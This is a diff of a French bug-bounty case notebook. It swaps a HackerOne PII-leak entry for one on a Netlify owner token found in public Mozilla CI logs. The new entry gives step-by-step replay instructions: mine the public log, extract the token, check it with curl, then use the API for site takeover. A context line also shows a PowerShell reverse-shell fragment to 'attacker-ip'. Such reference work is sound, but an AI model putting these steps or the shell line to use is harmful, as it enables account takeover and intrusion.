@@ -87,38 +87,50 @@ $client = New-Object System.Net.Sockets.TCPClient("attacker-ip",4444);
 
 **Paramètres impliqués :** `file_path`, `attacker-ip`, port `4444`
 
-### The /reports/:id.json endpoint discloses potentially sensitive user attributes
+### Netlify Authentication Token Exposed in Public Mozilla CI Logs
 
 **📄 Cas réel**
-sévérité : critical · [source](https://hackerone.com/reports/3000510)
+sévérité : critical · [source](https://hackerone.com/reports/2915647)
 
-Le `.json` d'un rapport divulgué expose bien plus que la page rendue : e-mail du reporter, codes de secours OTP, numéro de téléphone, `graphql_secret_token`, taille de t-shirt et autres données internes du compte reporter. Le chercheur a découvert le comportement en consultant un rapport divulgué et a rapporté immédiatement. Le titre de la source lie l'exposition à la présence du « reporter summary » du rapport. Le rapport a été marqué *resolved*.
+Un token d'authentification Netlify du compte « Mozilla IT Web SRE » a été trouvé dans un log CI public de Mozilla (`live.log`, task `d5NRF8FdQamV9XdPO_mTBQ`, mot-clé `auth:`). Le token, valide pour l'API Netlify, portait les rôles Owner, Developer, Billing Admin, Reviewer, Publisher et Content Editor, donnant un contrôle complet sur les sites (dont `https://crash-pings.mozilla.org`), le déploiement, les variables d'environnement, les logs et la facturation. Le rapport liste comme risques le détournement de l'email de facturation, la compromission de sites, l'exposition de données et la perte définitive de contrôle. La valeur du token est masquée (`███`) dans le rapport.
 
-**Cause racine :** l'endpoint `.json` d'un rapport divulgué sérialise des attributs privés du compte reporter (e-mail, OTP, token interne) au lieu de les restreindre à la vue publique — la source ne documente pas le correctif exact.
+**Cause racine :** un pipeline CI a écrit un token d'authentification vivant dans des logs de build accessibles publiquement, sans masquage — exposition de credential dans un artefact public.
 
 **Preuve technique (verbatim depuis la source) :**
 
-```http
-GET /reports/█████.json HTTP/2
-Host: hackerone.com
 ```
-```text
-The.json endpoint of any disclosed report is leaking reporter's email, OTP backup codes, reporter's phone number, "graphql_secret_token", tshirt size all the reporter account's internal details etc.
+curl -X GET https://api.netlify.com/api/v1/accounts -H "Authorization: Bearer ████" -s | jq
+
+    "roles_allowed": [
+      "Owner",
+      "Developer",
+      "Billing Admin",
+      "Reviewer",
+      "Publisher",
+      "Content Editor"
+    ],
+
+   - Search for the keyword `auth:` in the log file.
+   - Extract the Netlify token (e.g., `███`).
 ```
 
 **Rejouer / exploiter (dérivé de la source) :**
-- Prérequis : aucun compte — il suffit de connaître l'identifiant d'un rapport divulgué ; la condition d'exposition est la présence du reporter summary.
-- Étapes : 1. ouvrir un rapport divulgué de HackerOne et relever son identifiant numérique. 2. Requêter le même rapport avec l'extension `.json` (`GET /reports/<id>.json`, `Host: hackerone.com`). 3. Inspecter la réponse et les champs privés du reporter (e-mail, OTP, téléphone, tokens).
-- Pièges / limites : les identifiants et les valeurs du PoC sont caviardés (█████) dans la source ; la mention « any disclosed report » indique que les rapports non divulgués ne sont pas concernés ; le rapport est marqué *resolved* — la fenêtre d'exploitation est fermée.
+- Prérequis : aucun compte — la page de log est publique : `https://firefox-ci-tc.services.mozilla.com/tasks/d5NRF8FdQamV9XdPO_mTBQ/runs/0/logs/public/logs/live.log`. Le token réel est masqué dans le rapport (non rejouable tel quel).
+- Étapes : 1. Ouvrir l'URL du log public. 2. Chercher le mot-clé `auth:` et extraire le token Netlify. 3. Vérifier sa validité : `curl -X GET https://api.netlify.com/api/v1/accounts -H "Authorization: Bearer <token>" -s | jq` → réponse contenant les infos du compte (name, role, billing_email, roles_allowed, saml_config…). 4. Confirmer l'accès complet via les autres endpoints de l'API Netlify (déployer, supprimer, modifier des sites ; lire variables d'environnement et logs) — la documentation référence est `https://open-api.netlify.com`.
+- Pièges / limites : le token est intégralement masqué (`███`) et a vraisemblablement été révoqué ; le rejeu nécessite un log équivalent non nettoyé. La source recommande révocation, audit des pipelines (masquage) et scopes OAuth/IP allowlisting.
 
-**Reproductibilité :** moyenne — endpoint public sans authentification, mais identifiants exacts caviardés et comportement corrigé (rapport *resolved*).
+**Reproductibilité :** basse — le credential est masqué dans la source et la révocation n'est qu'une recommandation du rapport (non confirmée) ; seule la technique (fouille de logs CI publics) est rejouable, pas l'artefact.
 
-**Techniques :** json api over-exposure, reporter pii leak, mixed serialization (public vs private fields), unauthenticated api access
+**Techniques :** secrets in public ci logs, token leak, public build logs, api token abuse, credential exposure, log mining
 
-**Correspond aux classes qualifiantes :** info disclosure (pii/credentials), idor adjacent (accès direct au JSON d'une ressource)
+**Correspond aux classes qualifiantes :** information disclosure, credential leak, ato (account/site takeover)
 
 **Signal (endpoints/fonctions observés) :**
-- `GET /reports/:id.json` sur hackerone.com
-- champs exposés : `graphql_secret_token`, e-mail, OTP backup codes, numéro de téléphone, tshirt size
+- log public `…/tasks/d5NRF8FdQamV9XdPO_mTBQ/runs/0/logs/public/logs/live.log` (mot-clé `auth:`)
+- `https://api.netlify.com/api/v1/accounts` avec `Authorization: Bearer`
+- compte « Mozilla IT Web SRE », site `https://crash-pings.mozilla.org`
 
-**Paramètres impliqués :** `:id` (identifiant de rapport divulgué)
+**Paramètres impliqués :** `Authorization: Bearer`, `billing_email`, `selected_access_site_ids`, `roles_allowed`
+
+---
+
